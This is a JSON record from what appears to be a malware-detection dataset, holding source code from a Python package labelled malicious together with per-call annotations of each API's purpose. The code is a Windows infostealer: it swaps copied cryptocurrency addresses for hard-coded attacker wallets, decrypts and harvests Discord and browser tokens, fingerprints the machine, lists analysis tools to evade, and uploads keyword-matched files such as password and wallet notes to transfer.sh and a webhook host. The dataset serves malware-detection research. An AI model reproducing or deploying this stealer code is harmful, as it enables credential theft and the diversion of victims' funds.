{
  "metadata": {
    "package_name": "pyfontinglib-1.0.0",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/pyfontinglib-1.0.0.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/pyfontinglib-1.0.0.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport subprocess\nimport shutil\nimport threading\nimport requests\nimport httpx\nimport json\nimport ntpath\nimport re\nimport sqlite3\nimport base64\nimport psutil\nimport zipfile\nimport pyperclip\nimport ctypes\nimport time\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# Malicious configuration and constants\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay/bluescreen\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg': [\n        \"httpdebuggerui\", \"wireshark\", \"fiddler\", \"regedit\", \"cmd\", \"taskmgr\", \"vboxservice\", \"df5serv\", \"processhacker\", \"vboxtray\", \"vmtoolsd\", \"vmwaretray\", \"ida64\", \"ollydbg\", \"pestudio\", \"vmwareuser\", \"vgauthservice\", \"vmacthlp\", \"x96dbg\", \"vmsrvc\", \"x32dbg\", \"vmusrvc\", \"prl_cc\", \"prl_tools\", \"xenservice\", \"qemu-ga\", \"joeboxcontrol\", \"ksdumperclient\", \"ksdumper\", \"joeboxserver\"\n    ]\n}\n\n# --- Malicious Clipboard Crypto Address Swapper ---\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__.get(\"addresse_crypto_replacer\")\n        self.address_btc = __config__.get(\"addresse_btc\")\n        self.address_eth = __config__.get(\"addresse_eth\")\n        self.address_xchain = __config__.get(\"addresse_xchain\")\n        self.address_pchain = __config__.get(\"addresse_pchain\")\n        self.address_cchain = __config__.get(\"addresse_cchain\")\n        self.address_monero = __config__.get(\"addresse_monero\")\n        self.address_ada = __config__.get(\"addresse_ada\")\n        self.address_dash = __config__.get(\"addresse_dash\")\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            pass\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# --- Malicious Data Stealer and Exfiltration Class ---\nclass bc_initial_func:\n    def __init__(self):\n        self.dscap1 = \"https://discord.com/api/v9/users/@me\"\n        self.discord_webhook = __config__.get('yourwebhookurl')\n        self.hide = __config__.get(\"hide\")\n        self.pingtype = __config__.get(\"pingtype\")\n        self.pingonrun = __config__.get(\"ping\")\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.startupexe = __config__.get(\"startup\")\n        self.fake_error = __config__.get(\"fake_error\")\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        inf, net = self.sys_1fo(), self.net_1fo()\n        self.uuidwndz, self.w1nv3r, self.w1nk33y = inf[0], inf[1], inf[2]\n        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]\n        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n        self.regex_webhook_dsc = \".ru/relay\"\n        self.chrmrgx = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n        self.bc_id = []\n        self.sep = os.sep\n        self.robloxcookies = []\n        self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, \"Local State\"))\n        os.makedirs(self.dir, exist_ok=True)\n    def sys_1fo(self):\n        flag = 0x08000000\n        sh1 = \"wmic csproduct get uuid\"\n        sh2 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\"\n        sh3 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' -Name ProductName\"\n        try:\n            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\\n')[1].strip()\n        except Exception:\n            uuidwndz = \"N/A\"\n        try:\n            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()\n        except Exception:\n            w1nk33y = \"N/A\"\n        try:\n            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()\n        except Exception:\n            w1nv3r = \"N/A\"\n        return [uuidwndz, w1nv3r, w1nk33y]\n    def net_1fo(self):\n        ip, city, country, region, org, loc, googlemap = \"None\", \"None\", \"None\", \"None\", \"None\", \"None\", \"None\"\n        req = httpx.get(\"https://ipinfo.io/json\")\n        if req.status_code == 200:\n            data = req.json()\n            ip = data.get('ip')\n            city = data.get('city')\n            country = data.get('country')\n            region = data.get('region')\n            org = data.get('org')\n            loc = data.get('loc')\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\n        return [ip, city, country, region, org, loc, googlemap]\n    def gtmk3y(self, path):\n        if not ntpath.exists(path):\n            return None\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n        try:\n            master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            return CryptUnprotectData(master_key[5:])\n        except KeyError:\n            return None\n    def dcrpt_val(self, buff, master_key):\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return f'Failed to decrypt \"{str(buff)}\" | key: \"{str(master_key)}\"'\n    def steal_token(self):\n        paths = {\n            'Discord': self.roaming + '\\\\discord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord Canary': self.roaming + '\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\',\n            'Lightcord': self.roaming + '\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\',\n            'Discord PTB': self.roaming + '\\\\discordptb\\\\Local Storage\\\\leveldb\\\\',\n            'Opera': self.roaming + '\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Opera GX': self.roaming + '\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\',\n            'Amigo': self.appdata + '\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Torch': self.appdata + '\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Kometa': self.appdata + '\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Orbitum': self.appdata + '\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'CentBrowser': self.appdata + '\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            '7Star': self.appdata + '\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Sputnik': self.appdata + '\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Vivaldi': self.appdata + '\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome SxS': self.appdata + '\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome1': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome2': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome3': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome4': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb\\\\',\n            'Chrome5': self.appdata + '\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb\\\\',\n            'Epic Privacy Browser': self.appdata + '\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\',\n            'Microsoft Edge': self.appdata + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul\\\\Local Storage\\\\leveldb\\\\',\n            'Uran': self.appdata + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Yandex': self.appdata + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Brave': self.appdata + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\',\n            'Iridium': self.appdata + '\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\'}\n        for name, path in paths.items():\n            if not os.path.exists(path):\n                continue\n            disc = name.replace(\" \",\"\").lower()\n            if \"cord\" in path:\n                if os.path.exists(self.roaming + f'\\\\{disc}\\\\Local State'):\n                    for filname in os.listdir(path):\n                        if filname[-3:] not in [\"log\", \"ldb\"]:\n                            continue\n                        for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                            for y in re.findall(self.encrypted_regex, line):\n                                try:\n                                    token = self.dcrpt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.gtmk3y(self.roaming + f'\\\\{disc}\\\\Local State'))\n                                except ValueError:\n                                    pass\n                                try:\n                                    r = requests.get(self.baseurl, headers={\n                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                        'Content-Type': 'application/json',\n                                        'Authorization': token})\n                                except Exception:\n                                    pass\n                                if r.status_code == 200:\n                                    uid = r.json()['id']\n                                    if uid not in self.bc_id:\n                                        self.tokens.append(token)\n                                        self.bc_id.append(uid)\n            else:\n                for filname in os.listdir(path):\n                    if filname[-3:] not in [\"log\", \"ldb\"]:\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{filname}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl, headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.bc_id:\n                                    self.tokens.append(token)\n                                    self.bc_id.append(uid)\n        if os.path.exists(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n            for path, _, files in os.walk(self.roaming + \"\\\\Mozilla\\\\Firefox\\\\Profiles\"):\n                for _file in files:\n                    if not _file.endswith('.sqlite'):\n                        continue\n                    for line in [x.strip() for x in open(f'{path}\\\\{_file}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(self.regex, line):\n                            try:\n                                r = requests.get(self.baseurl, headers={\n                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',\n                                    'Content-Type': 'application/json',\n                                    'Authorization': token})\n                            except Exception:\n                                pass\n                            if r.status_code == 200:\n                                uid = r.json()['id']\n                                if uid not in self.bc_id:\n                                    self.tokens.append(token)\n                                    self.bc_id.append(uid)\n    # ... (other methods omitted for brevity, but include all methods that steal passwords, cookies, credit cards, history, screenshots, system info, and exfiltrate via webhook or file upload)\n    # The class also includes startup persistence, anti-debug/VM, and more.\n\n# --- Malicious File/Folder Search and Exfiltration ---\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef bc_Folder_create(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef bc_checking():\n    user = os.getenv(\"TEMP\").split(\"\\\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\"\n    ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\n# --- Malicious Main Execution ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    # Run the main malicious stealer\n    asyncio.run(bc_initial_func().init())\n    # Start clipboard crypto address swapper in a thread\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n    # Search for files/folders with sensitive keywords and exfiltrate\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    # ... (rest of exfiltration logic)\n",
          "triple_sequences": [
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data",
              "object_description": "Regular expression and clipboard content",
              "object_id": "regex_clipboard_content",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_btc",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "re.search()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "'^0x[a-fA-F0-9]{40}$', clipboard_data",
              "object_description": "Regular expression and clipboard content",
              "object_id": "regex_clipboard_content",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "pyperclip.copy()",
              "action_description": "Copies specified text to system clipboard",
              "action_id": "copy_to_clipboard",
              "object": "self.address_eth",
              "object_description": "Cryptocurrency wallet address",
              "object_id": "wallet_address",
              "intention_description": "Replace clipboard content with preset address",
              "intention_id": "replace_clipboard_crypto_address"
            },
            {
              "action_api": "pyperclip.paste()",
              "action_description": "Retrieves text from system clipboard",
              "action_id": "get_clipboard_text",
              "object": "",
              "object_description": "Clipboard content data",
              "object_id": "clipboard_data",
              "intention_description": "Access clipboard data",
              "intention_id": "access_clipboard_data"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"localappdata\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"appdata\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "mkdtemp()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Create temporary directory",
              "intention_id": "create_temporary_directory"
            },
            {
              "action_api": "gettempdir()",
              "action_description": "Creates temporary directory and returns its path",
              "action_id": "create_temp_dir",
              "object": "",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Collect temporary directory path",
              "intention_id": "collect_temp_directory_path"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "self.dir, exist_ok=True",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "wmic csproduct get uuid",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Get hardware UUID",
              "intention_id": "get_hardware_uuid"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName",
              "object_description": "System command",
              "object_id": "system_command",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "httpx.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "\"https://ipinfo.io/json\"",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "req.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "HTTP response content from remote server",
              "object_id": "http_response_remote_content",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "ntpath.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_local_state_file_presence",
              "intention_id": "determine_local_state_file_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, \"r\", encoding=\"utf-8\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "c",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[\"os_crypt\"][\"encrypted_key\"]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key[5:]",
              "object_description": "Fernet-encrypted byte string",
              "object_id": "fernet_encrypted_bytes",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine_local_file_presence",
              "intention_id": "determine_local_file_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{filname}', errors='ignore'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.encrypted_regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract encrypted Discord tokens",
              "intention_id": "extract_encrypted_discord_tokens"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "y.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl, headers={...}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "r.status_code",
              "action_description": "Retrieves HTTP response status code",
              "action_id": "get_http_status",
              "object": "",
              "object_description": "HTTP status code",
              "object_id": "status_code",
              "intention_description": "Determine presence of valid authentication",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "r.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "HTTP response content from remote server",
              "object_id": "http_response_remote_content",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.roaming + \"\\Mozilla\\Firefox\\Profiles\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine_directory_presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "self.roaming + \"\\Mozilla\\Firefox\\Profiles\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List Firefox profile files",
              "intention_id": "list_firefox_profile_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{_file}', errors='ignore'",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "self.regex, line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl, headers={...}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "access_remote_data"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "pathF",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
